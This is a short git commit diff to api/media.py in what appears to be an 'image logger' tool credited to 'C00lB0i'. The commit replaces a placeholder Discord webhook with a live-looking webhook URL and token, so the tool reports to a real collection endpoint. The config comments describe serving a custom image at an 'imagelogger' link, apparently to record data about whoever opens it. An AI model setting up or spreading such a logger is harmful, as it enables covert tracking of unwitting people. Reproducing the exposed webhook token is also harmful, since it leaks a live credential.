89fd7fa06e488411af952843a121ca28296a6f7b
staffvxdebi-art <staffvxdebi@gmail.com>
2026-01-20 14:57:02 +0400

    Update media.py

--- api/media.py
+++ api/media.py
@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "webhook": "https://discord.com/api/webhooks/1463119843367587925/2fgudjQla5Zh-5HQPlXz5M-19yZdxoLY9SmjuVZqaBaeU1kkvcbI6_2AML1de-rT4Wc0",
     "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
